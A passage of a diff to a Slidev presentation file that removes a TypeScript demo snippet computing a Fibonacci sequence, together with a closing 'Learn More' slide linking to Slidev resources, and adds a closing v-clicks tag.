-import { emptyArray, sayHello } from "./external";
-
-sayHello();
-console.log(`vue ${version}`);
-console.log(
-  emptyArray<number>(10).reduce(
-    (fib) => [...fib, fib.at(-1)! + fib.at(-2)!],
-    [1, 1],
-  ),
-);
-```
-
----
-layout: center
-class: text-center
-dragPos:
-  square: 0,-5,0,0
----
-
-# Learn More
-
-[Documentation](https://sli.dev) · [GitHub](https://github.com/slidevjs/slidev) · [Showcases](https://sli.dev/resources/showcases)
-
-<PoweredBySlidev mt-10 />
+</v-clicks>
